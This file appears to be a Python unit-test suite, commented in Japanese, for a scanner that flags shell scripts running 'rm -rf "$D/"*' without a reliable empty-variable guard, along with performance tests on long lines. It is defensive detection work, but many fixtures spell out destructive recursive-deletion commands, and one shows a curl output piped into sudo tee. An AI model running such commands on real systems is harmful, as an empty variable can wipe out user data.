            # 1 行の if の else の枝・fi のあと
            "n_else_same_line": ['if [ -n "$D" ]; then echo keep; else rm -rf "$D/"*; fi'],
            "n_after_fi_same_line": ['if [ -n "$D" ]; then echo ok; fi; rm -rf "$D/"*'],
            # && のうしろ・ループの中の if
            "if_behind_and": ['[ "$mode" = strict ] && if [ -z "$D" ]; then exit 1; fi', 'rm -rf "$D/"*'],
            "if_in_loop": ['for f in *.conf; do if [ -z "$D" ]; then exit 1; fi; done', 'rm -rf "$D/"*'],
            # 呼ばないかもしれない 1 行の関数の中
            "one_line_function": ['check() { [ -n "$D" ] || exit 1; }', 'rm -rf "$D/"*'],
            "one_line_function_assert": ['need() { : "${D:?}"; }', 'rm -rf "$D/"*'],
            # elif（前の枝を通ると確かめない）
            "elif_z": ['if [ "$1" = --keep ]; then :; elif [ -z "$D" ]; then exit 1; fi', 'rm -rf "$D/"*'],
            "closes_same_line": ['if [ "$m" = a ]; then', '  [ -n "$D" ] || exit 1; fi', 'rm -rf "$D/"*'],
            # 引用符の中の exit・if
            "trap_exit": ['if [ -z "$D" ]; then', '  trap "cleanup; exit 1" INT', "fi", 'rm -rf "$D/"*'],
            "quoted_if": ['if [ -n "$D" ]; then', '  grep -q "x; if" f', "else", '  rm -rf "$D/"*', "fi"],
            # [ ] の中の -o・-a
            "test_or": ['[ -n "$D" -o -n "$E" ] && rm -rf "$D/"*'],
            "test_and_exit": ['[ -z "$D" -a "$x" = 1 ] && exit 1', 'rm -rf "$D/"*'],
            # done; if … の行の、入れ子の if の中の exit
            "if_after_done": [
                "for x in a; do",
                "  :",
                'done; if [ -z "$D" ]; then',
                '  if [ "$force" = 1 ]; then',
                "    exit 1",
                "  fi",
                "fi",
                'rm -rf "$D/"*',
            ],
        }
        self.assertEqual(self.flagged_files(scripts), set(scripts))

    def test_fifth_review_misses(self) -> None:
        scripts = {
            # 確かめたあとで、値を入れ直すもの
            "reassigned": ['[ -n "$D" ] || exit 1', "D=$(compute)", 'rm -rf "$D/"*'],
            "local_in_function": ['[ -n "$D" ] || exit 1', 'f() { local D="$1"; rm -rf "$D/"*; }'],
            "shift": [': "${1:?}"', "shift", 'rm -rf "$1/"*'],
            # 関数の中の $1 は、関数の引数（一番外側の $1 とは別の値）
            "positional_in_function": ['[ -n "$1" ] || { echo usage; exit 1; }', 'clean() { rm -rf "$1/"*; }', 'clean "$OTHER"'],
            # 複数行の ( … ) の中の exit・代入は、親のシェルに効かない
            "subshell_exit": ["(", '  [ -n "$D" ] || exit 1', ")", 'rm -rf "$D/"*'],
            "subshell_assign": ["(", "  D=/tmp/build", ")", 'rm -rf "$D/"*'],
            # 止まらないもの（failed=1 は代入、usage は exit しない、一番外側の return は先に進む）
            "failed_var": ['[ -n "$D" ] || failed=1', 'rm -rf "$D/"*'],
            "if_failed_var": ['if [ -z "$D" ]; then failed=1; fi', 'rm -rf "$D/"*'],
            "usage_no_exit": ["usage() { echo usage; }", '[ -n "$D" ] || usage', 'rm -rf "$D/"*'],
            "top_return": ['[ -n "$D" ] || return', 'rm -rf "$D/"*'],
            # 行末の \ で次の行に続けた条件
            "continued_or": ['if [ -n "$D" ] \\', '   || [ "$FORCE" = 1 ]; then', '  rm -rf "$D/"*', "fi"],
            "continued_and": ['if [ -z "$D" ] \\', '   && [ "$X" = 1 ]; then exit 1; fi', 'rm -rf "$D/"*'],
            # ほかのコマンドに単一引用符で渡した文字列の中
            "ssh_quoted": ["ssh host '[ -n \"$D\" ] || exit 1'", 'rm -rf "$D/"*'],
            "sed_quoted": ["sed 's/${D:?}/x/' f", 'rm -rf "$D/"*'],
            # ヒアドキュメントの中の代入・if
            "heredoc_assign": ["cat > /etc/app.env <<EOF", "APP_DIR=/opt/app", "EOF", 'rm -rf "$APP_DIR/"*'],
            "heredoc_python": [
                'if [ -n "$D" ]; then',
                "  python3 - <<'PY'",
                "if x:",
                "    pass",
                "else:",
                "    pass",
                "PY",
                "fi",
                'rm -rf "$D/"*',
            ],
            # 引用符の中の $(…) の中の exit
            "exit_in_substitution": ['if [ -z "$D" ]; then', '  x="$(echo "a; exit")"', "fi", 'rm -rf "$D/"*'],
        }
        self.assertEqual(self.flagged_files(scripts), set(scripts))

    def test_fifth_review_still_guarded(self) -> None:
        scripts = {
            "die_defined": ['die() { echo "$*" >&2; exit 1; }', '[ -n "$D" ] || die "D is empty"', 'rm -rf "$D/"*'],
            "die_multiline": ["die() {", '  echo "$*" >&2', "  exit 1", "}", '[ -z "$D" ] && die "no D"', 'rm -rf "$D/"*'],
            "positional_top": ['[ -n "$1" ] || exit 1', 'rm -rf "$1/"*'],
            "heredoc_then_assign": ["cat <<EOF", "hello", "EOF", "OUT=/tmp/out", 'rm -rf "$OUT/"*'],
            "reassign_before_check": ["D=$(compute)", '[ -n "$D" ] || exit 1', 'rm -rf "$D/"*'],
        }
        self.assertEqual(self.flagged_files(scripts), set())

    def test_fish_files_are_not_checked(self) -> None:
        # 5 回目のレビューのあとで決めた範囲: fish は if … end・and・or と書き方が違い、確かめを読めないので見ない
        self.write({"scripts/x.fish": 'if test -n "$D"\n  echo ok\nend\nrm -rf "$D/"*\n'})
        self.assertEqual(self.lines_of("CFG-018"), set())

    def test_checks_inside_functions_are_not_followed(self) -> None:
        # 4 回目のレビューのあとで決めた範囲: 関数・if・case などのブロックの中の確かめは追わない（どの枝・どの呼び出しで
        # 通るかを行ごとの読み方では決められず、追うたびに取りこぼしが出たため）。3 回目までは、この 2 つを守られていると
        # 見ていた。低の指摘として出し、rm の中で "${D:?}/"* と書くよう勧める
        scripts = {
            "assert_in_function": ["main() {", '  : "${D:?}"', '  rm -rf "$D/"*', "}"],
            "exit_in_function": ["main() {", '  [ -n "$D" ] || exit 1', '  rm -rf "$D/"*', "}"],
        }
        self.assertEqual(self.flagged_files(scripts), set(scripts))

    def test_third_review_still_guarded(self) -> None:
        scripts = {
            "and_chain": ['[ -n "$D" ] && cd /tmp && rm -rf "$D/"*'],
            # 4 回目のレビュー: || { exit 1; } と、1 行の if の then の枝の中
            "brace_exit": ['[ -n "$D" ] || { exit 1; }', 'rm -rf "$D/"*'],
            "one_line_then": ['if [ -n "$D" ]; then echo a; rm -rf "$D/"*; fi'],
            "if_n_then": ['if [ -n "$D" ]; then', '  rm -rf "$D/"*', "else", "  echo empty", "fi"],
            "if_z_else": ['if [ -z "$D" ]; then', "  exit 1", "else", '  echo "$D"', "fi", 'rm -rf "$D/"*'],
            "z_or_cond": ['if [ -z "$D" ] || [ ! -d "$D" ]; then exit 1; fi', 'rm -rf "$D/"*'],
            "double_bracket": ['[[ -n $D ]] && rm -rf "$D/"*'],
            "sourced_before": [". ./config.sh", "DEST=/srv/app", 'rm -rf "$DEST/"*'],
        }
        self.assertEqual(self.flagged_files(scripts), set())


class LongLineTests(Case):
    def test_long_lines_do_not_hang(self) -> None:
        cases = {
            # 引用符・パイプを読み進める所が組み合わせで増えないこと（自己展開のインストーラは 1 行が長い）
            "quoted_args": "curl " + '"a" -H "b|c" ' * 20000 + "x\n",
            "rm_args": "rm -rf " + "$A/b " * 20000 + "\n",
            "chmod_options": "chmod " + "-R " * 20000 + "755 x\n",
            # 同じコマンドの名前が並ぶ行（当たり始めの位置ごとに行末まで読み直していた）
            "same_names": "".join(f"{name} " * 20000 + "\n" for name in ("curl", "wget", "pip")),
            "curl_in_quotes": 'echo "' + "curl " * 20000 + "\n",
            "http_dots": "http." * 20000 + "\n",
            # sudo のオプションと、その引数の分け方が組み合わせで増えていた
            "sudo_options": "curl x | " + "su" + "do " + "-a " * 40 + "tee\n",
            # CFG-018 で、-z の位置ごとに行の残りを読み直していた
            "z_tests": '[ -z "$X" ] ' * 20000 + "\n",
            # rm の行ごとにファイル全体を読み直していた（行の数の 2 乗で遅くなる）
            "rm_lines": "".join(f'rm -rf "$A{i}/"*\n' for i in range(15000)),
            # if・elif・{ ごとに、閉じる所をファイルの終わりまで探し直していた
            "if_tests": 'if [ -n "$X" ]; then ' * 5000 + "\n",
            "elif_lines": 'elif [ -z "$Y" ]; then\n' * 3000,
            # if の中の exit・代入を、確かめのたびに行の残りから探していた
            "elif_tests": 'elif [ -z "$Y" ]; then ' * 20000 + "\n",
            # IFS= read の前置きの代入を、( の位置ごとに行の終わりまで読み直していた
            "unclosed_substitution": "x=$(" * 20000 + "\n",
            # rm ごとに、同じ変数の確かめの範囲を全部見ていた（1 行で閉じる if の範囲は、あとの rm を守らない）
            "guards_and_rms": 'if [ -n "$X" ]; then :; fi\n' * 15000 + 'rm -rf "$X/"*\n' * 15000,
            "brace_groups": '[ -n "$Z" ] && {\n' * 3000,
            # CFG-017 の記号モードが、長い行で 2 乗になっていた
            "chmod_symbolic_who": "chmod " + "o" * 60000 + "+x\n",
            "chmod_symbolic_clauses": "chmod " + "a+w," * 30000 + "o-w\n",
            # 骨組みを作る所・ヒアドキュメント・ブロックの組
            "nested_quotes": 'x="$(echo "' * 10000 + "\n",
            "heredocs": "cat <<EOF\nx\nEOF\n" * 5000,
            "blocks": "{ echo x; } >> f\n" * 10000,
        }
        # どのファイルにも rm -r を入れる（CFG-018 は rm -r のあるファイルだけを読む）
        self.write({f"long/{name}.sh": body + 'rm -rf "$A/"*\n' for name, body in cases.items()})

        for name in cases:
            with self.subTest(name):

                def timeout(*_args, name=name):
                    raise TimeoutError(f"シェルのルールが {name} で 5 秒で終わらない")

                old = signal.signal(signal.SIGALRM, timeout)
                signal.alarm(5)
                try:
                    result = scan(self.root / "long" / f"{name}.sh", ScanOptions(min_severity=Severity.INFO))
                finally:
                    signal.alarm(0)
                    signal.signal(signal.SIGALRM, old)
                # 大きすぎて読み飛ばしたファイルがあると、このテストは何も確かめていない
                self.assertEqual((result.stats["files_scanned"], result.stats["files_skipped"]), (1, 0))


class CoverageTests(Case):
    def test_shell_is_listed_with_its_rules(self) -> None:
        self.write({"scripts/a.sh": "echo a\n", "scripts/b.zsh": "echo b\n"})
        (shell,) = [item for item in self.scan().languages if item["language"] == "shell"]
        self.assertEqual((shell["files"], shell["rules"]), (2, 6))


if __name__ == "__main__":
    unittest.main()
